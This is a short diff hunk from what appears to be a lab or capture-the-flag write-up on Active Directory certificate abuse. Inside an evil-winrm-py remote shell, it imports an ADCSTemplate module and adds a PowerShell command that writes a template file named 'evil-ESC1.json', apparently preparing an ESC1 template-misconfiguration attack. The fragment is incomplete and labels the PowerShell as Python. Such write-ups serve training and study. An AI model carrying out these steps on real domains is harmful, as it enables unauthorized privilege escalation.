@@ -1069,6 +1069,7 @@ evil-winrm-py PS C:\Users\e.black\Desktop> Import-Module .\ADCSTemplate.psm1
 Ill then import it
 
 ```python
+evil-winrm-py PS C:\Users\e.black\Desktop> type Machine.json | ConvertTo-Json | Set-Content evil-ESC1.json
 
 ```
 
